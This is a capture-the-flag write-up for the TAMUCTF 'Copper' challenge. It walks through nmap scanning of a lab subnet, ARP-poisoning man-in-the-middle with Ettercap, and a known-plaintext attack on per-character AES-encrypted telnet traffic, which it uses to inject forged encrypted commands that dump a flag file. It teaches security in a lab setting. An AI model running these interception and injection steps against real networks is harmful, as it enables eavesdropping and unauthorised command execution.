# TAMUCTF Copper (Network/Pentest) Write-Up

### Given
```TeXt
Bob learned that telnet was actually not secure. Because Bob is a good administrator he wanted to make his own, more secure, version of telnet. He heard AES was secure so he decided to use that.

Here is the script he runs every day over telnet:

ls -la
date > monitor.txt
echo "=========================================" >> monitor.txt
echo "ps -aux" >> monitor.txt
ps -aux >> monitor.txt
echo "=========================================" >> monitor.txt
echo "df -h" >> monitor.txt
df -h >> monitor.txt
cp ./monitor.txt /logs
exit

Difficulty: medium
```

### Let us begin!
1. First we need to see what’s going on in this network.

	```TeXt
	nmap 172.30.0.0/28

	Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-03 20:43 CST
	Nmap scan report for 172.30.0.2
	Host is up (0.087s latency).
	Not shown: 999 closed ports
	PORT     STATE SERVICE
	8080/tcp open  http-proxy
	MAC Address: 02:42:49:5F:5E:5D (Unknown)

	Nmap scan report for 172.30.0.3
	Host is up (0.086s latency).
	All 1000 scanned ports on 172.30.0.3 are closed
	MAC Address: 02:42:1C:3A:87:FA (Unknown)

	Nmap scan report for 172.30.0.14
	Host is up (0.0000050s latency).
	All 1000 scanned ports on 172.30.0.14 are closed

	Nmap done: 16 IP addresses (3 hosts up) scanned in 10.87 seconds
	```

	As we can see there is an open port `8080` on `172.30.0.2	` but the challenge tells us Bob connects over telnet…

	We need to see if there are non-standard ports open that could take telnet… and this can take some time to run

	```TeXt
	nmap -p 1-65535 172.30.0.0/28

	Nmap scan report for 172.30.0.2
	Host is up (0.087s latency).
	Not shown: 65533 closed ports
	PORT     STATE SERVICE
	6023/tcp open  x11
	8080/tcp open  http-proxy
	MAC Address: 02:42:49:5F:5E:5D (Unknown)

	Nmap scan report for 172.30.0.3
	Host is up (0.087s latency).
	All 65535 scanned ports on 172.30.0.3 are closed
	MAC Address: 02:42:1C:3A:87:FA (Unknown)

	Nmap scan report for 172.30.0.14
	Host is up (0.0000050s latency).
	All 65535 scanned ports on 172.30.0.14 are closed

	Nmap done: 16 IP addresses (3 hosts up) scanned in 570.74 seconds

	```

	Hey look another open port! Well unfortunately we don’t really know what it is yet. However we are going to ignore that nmap has **guessed** it to be x11. It is ##23 so I’m going to assume it’s telnet. 

	Thankfully this connects so we know 6023 is telnet and not x11 traffic. 

	```TeXt
	telnet 172.30.0.2 6023
	```


2. Taking what we know from the last challenge since these seems to build on themselves, we can see that there are two hosts on this network and we can go ahead and assume we need to become the router again and steal the traffic.

	**Arp Spoofing**

	Lets crack open Ettercap

	```
	ettercap -G 				Opens etter in graphical mode
	```

	First we gotta tell ettercap what it’s doing open.

	```
	Sniff > Unified Sniffing > tap0 > OK

	This is telling ettercap to sniff the unified network tap0 which is going to set out interface to the VPN we connected to for the challenges
	```

	Next we need to tell ettercap where the hosts are. Or actually let it find them itself. 

	```
	Hosts > Scan for hosts
	```

	Done. It now knows who’s online

	Now we need to actually specify the mode of the ettercap man in the middle attack. 

	```
	Mitm > Arp Poisioning > Sniff remote connections (leave Only poision one way OFF) > OK

	This is setting the Mitm mode to ARP spoofing.  
	```


3.  Once we are in wireshark and watching the traffic over tap0 we can see that a lot of traffic is rolling in. 

	Lets click on any of the TCP streams and follow it.

	This is a snippet of what you should see…

	```
	YiqMxpZQz+5dPf+qELowBw==YiqMxpZQz+5dPf+qELowBw==US5MJOeTx6L69iQT3Y8B9g==US5MJOeTx6L69iQT3Y8B9g==83jbJmmZc/RUXML8GcGuVg==83jbJmmZc/RUXML8GcGuVg==h8zZvECdaFr730Mgo5EgYQ==h8zZvECdaFr730Mgo5EgYQ==YiqMxpZQz+5dPf+qELowBw==YiqMxpZQz+5dPf+qELowBw==RdGNIA97r2yYuQsdXjbQGA==RdGNIA97r2yYuQsdXjbQGA==S+79/0xJH6oVAqvGSE+Vlw==S+79/0xJH6oVAqvGSE+Vlw==fgGU2dbDvV/tVy3pk1PL3RtH3cGz/iZONajZ8BEPWHG7po66JCI5Op/jKLRdZlb31eFpjL6PbjBkXoovQ+RAzrOdJj46ilT61DOaQS5qHqGNzfRd6oP5OVqsSQfL7KRc1dK33psltMaeljuYxprLLDlbQVJOy5/2Rj0hUuX2Xu1eUrhcsOFVR8DM9BzYiVUtlA417iX2kt/NfiPW7VAE/A8jFusY2vPXAkog4PlELnMVpLWulfLoJiiKvLdbEhiZM/+rdhmEpXYXbNHmQFodAguMcHTyZnKVFhJ7v8bOb5vKMB+4s7cNaDQrFwTEtfjm0ucK4gjFcmCDfScYw6c5UA==vCffRJyLzPpoDVYNvxEtoA==vCffRJyLzPpoDVYNvxEtoA==RdGNIA97r2yYuQsdXjbQGA==RdGNIA97r2yYuQsdXjbQGA==MufXoG4oKY+tLj7TNMzMtQ==MufXoG4oKY+tLj7TNMzMtQ==9+fXRGjlf3TvpwR6XiqcSw==9+fXRGjlf3TvpwR6XiqcSw==83jbJmmZc/RUXML8GcGuVg==83jbJmmZc/RUXML8GcGuVg==bIyEa1uO0qUPR+sBqjAJ8g==bIyEa1uO0qUPR+sBqjAJ8g==83jbJmmZc/RUXML8GcGuVg==83jbJmmZc/RUXML8GcGuVg==0bGyNN1VKjWCxituvKDVvg==0bGyNN1VKjWCxituvKDVvg==/Ks7iNV5tZaZT32Epav0CA==/Ks7iNV5tZaZT32Epav0CA==
	```

	So for this to make any sense we need to get some information regarding telnet. Telnet only prints something in the window if it’s echoed back. That might take some time to sink in so I’ve got a small example below

	```
	If you're putting in the command `date`, in telnet we will see it as 

		ddaattee because you type d and it types it back. You type a and it types it back etc.
	```

	With this in mind if we analyze the traffic using wireshark’s lovely coloring we can see that this is just a regular telnet session with some encrypted characters onto it. Hey wait a minute! Didn’t it tell us that Bob was running commands in the given text?

4. So at this point you still might be lost and that’s fine cause I certainly was. So lets make an assumption here. Lets say that the command `ls` is actually `57` meaning `l=5` and `s=7`. The next few numbers can be easily deciphered but we only care about 5 and 7. Lets say we get a string of numbers such as `57095`. For convenience lets tell you that `space=0` and `-=9` Which would translate 57095 into `ls -l`. Well guess what! That’s literally the basis of this entire challenge.

	We’ve seen that he runs `ls -la` and instead of `l=5` it actually equals `YiqMxpZQz+5dPf+qELowBw==` which is nice but also not.  This means we can build a character map to see what characters equal the encrypted strings. This is known as a `known plaintext attack` which can be used even in today’s attacks. 

	So also notice that on telnet no login pops up? Weird huh well for the saving of time I’m just going to say that this means we are going to copy and paste our commands we make by hand straight in there and let them run with no credentials. 

	At this point we need to make a character map…

	```TeXt
	= : Tkb8E728rfsc+V1i5HtOzQ==
	l : YiqMxpZQz+5dPf+qELowBw==
	s : US5MJOeTx6L69iQT3Y8B9g==
	> : bIyEa1uO0qUPR+sBqjAJ8g==
	o : /Ks7iNV5tZaZT32Epav0CA==
	g : lwA3zobBmueRmJyafjFH9A==
	/ : pxsE18FW3UofpVPzG1RchA==
	Space : 83jbJmmZc/RUXML8GcGuVg==
	\n : S+79/0xJH6oVAqvGSE+Vlw==


	C : XpjdNQ+r0XfWy25TW5lyAg==
	A : RdGNIA97r2yYuQsdXjbQGA==
	T : MufXoG4oKY+tLj7TNMzMtQ==

	F : qgZnSf9/KcpMFM90/ZaklQ==
	L : YiqMxpZQz+5dPf+qELowBw==
	A : RdGNIA97r2yYuQsdXjbQGA==
	G : lwA3zobBmueRmJyafjFH9A==
	.txt: gCe+M22NmuwF6cPVKGGoZQ==MufXoG4oKY+tLj7TNMzMtQ==wJNrzltAAb7rg/64niXZNg==MufXoG4oKY+tLj7TNMzMtQ==
	```

5. Lets look at the web server now. We need to understand where we are so we can drop the output of our commands in somewhere we can read them. So we see from given that Bob moves the monitor file from wherever he is into /logs/ and because we can see the monitor file we will now be assuming that we are a web server running in /logs/. With information as such when we run our commands we want to dump them in /logs/ so we may be able to view them.

6. So the first command we shall create is ls\>/logs/l so we can see what’s in the directory and then pipe that output to the file in logs that we can see from the web server. 

	```TeXt
	ls>/logs/l

	YiqMxpZQz+5dPf+qELowBw==US5MJOeTx6L69iQT3Y8B9g==bIyEa1uO0qUPR+sBqjAJ8g==pxsE18FW3UofpVPzG1RchA==YiqMxpZQz+5dPf+qELowBw==/Ks7iNV5tZaZT32Epav0CA==lwA3zobBmueRmJyafjFH9A==US5MJOeTx6L69iQT3Y8B9g==pxsE18FW3UofpVPzG1RchA==YiqMxpZQz+5dPf+qELowBw==S+79/0xJH6oVAqvGSE+Vlw==
	```

	Running that returns

	```TeXt
	flag.txt
	monitor.txt
	server.py
	```


	and so now we know the next command needs to be cat flag.txt\>/logs/l

	Note is that the letters after /logs/ is only the name of the file and I chose those to be l and f because those are characters I already grabbed as appart of the charmap so I didn't need to do extra work

	```TeXt
	Cat flag.txt>/logs/f
		
		XpjdNQ+r0XfWy25TW5lyAg==RdGNIA97r2yYuQsdXjbQGA==MufXoG4oKY+tLj7TNMzMtQ==83jbJmmZc/RUXML8GcGuVg==qgZnSf9/KcpMFM90/ZaklQ==YiqMxpZQz+5dPf+qELowBw==RdGNIA97r2yYuQsdXjbQGA==lwA3zobBmueRmJyafjFH9A==gCe+M22NmuwF6cPVKGGoZQ==MufXoG4oKY+tLj7TNMzMtQ==wJNrzltAAb7rg/64niXZNg==MufXoG4oKY+tLj7TNMzMtQ==bIyEa1uO0qUPR+sBqjAJ8g==pxsE18FW3UofpVPzG1RchA==YiqMxpZQz+5dPf+qELowBw==/Ks7iNV5tZaZT32Epav0CA==lwA3zobBmueRmJyafjFH9A==US5MJOeTx6L69iQT3Y8B9g==pxsE18FW3UofpVPzG1RchA==YiqMxpZQz+5dPf+qELowBw==S+79/0xJH6oVAqvGSE+Vlw==
	```


	With that dumps 

	```TeXt
	gigem{43s_3cb_b4d_a5c452ed22aa5f1a}
	```
